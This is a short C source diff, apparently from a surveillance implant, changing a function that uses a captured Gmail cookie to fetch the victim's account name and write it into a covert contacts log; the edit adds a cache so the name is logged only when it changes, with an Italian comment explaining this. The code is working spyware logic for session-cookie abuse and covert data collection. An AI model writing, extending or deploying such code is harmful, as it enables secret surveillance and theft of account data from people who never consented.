@@ -173,6 +173,7 @@ DWORD HandleGMail(char *cookie)
 	BYTE *r_buffer = NULL;
 	DWORD response_len;
 	WCHAR mail_request[256];
+	static WCHAR last_user_name[256];
 	char ik_val[32];
 	char *ptr, *ptr2;
 	DWORD last_tstamp_hi, last_tstamp_lo;
@@ -215,10 +216,14 @@ DWORD HandleGMail(char *cookie)
 		FREE_PARSING(ptr2);
 		*ptr2 = 0;
 	
-		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
 		_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), _TRUNCATE, L"%S", ptr);		
-		DumpContact(hfile, CONTACT_SRC_GMAIL, mail_request, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
-		Log_CloseFile(hfile);
+		// Se e' diverso dall'ultimo username allora lo logga...
+		if (wcscmp(mail_request, last_user_name)) {
+			_snwprintf_s(last_user_name, sizeof(last_user_name)/sizeof(WCHAR), _TRUNCATE, L"%s", mail_request);		
+			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+			DumpContact(hfile, CONTACT_SRC_GMAIL, mail_request, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
+			Log_CloseFile(hfile);
+		}
 	}
 
 	SAFE_FREE(r_buffer);
